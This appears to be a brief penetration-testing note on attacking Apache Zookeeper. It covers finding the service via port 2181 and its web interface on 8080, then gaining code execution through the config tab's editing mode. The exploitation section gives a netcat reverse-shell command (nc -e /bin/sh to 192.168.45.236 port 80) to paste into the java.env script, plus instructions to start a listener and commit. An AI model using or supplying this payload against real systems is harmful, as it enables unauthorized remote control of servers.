Apache Zookeeper (2181/TCP)

Apache Zookeeper is a centralized service for maintaining configuration information, naming, providing distributed synchronization, and providing group services.

Enumeration

    In case you see that nessus outputs shows a 2181 port open you are likely dealing with an Apache Zookeeper instance.

    In that case, the interface is normally located at port 8080

    Once inside the interface we can check the version since it is displayed in the upper right corner.

Exploitation

    Here you have the same process with images. Here

    In order to obtain RCE go to the configtab then switch on the Editing mode

    And place the following code into the section java.env script

    $(/bin/nc -e /bin/sh 192.168.45.236 80 &)

    Then setup a listener and click in the Commit button to start the connection.
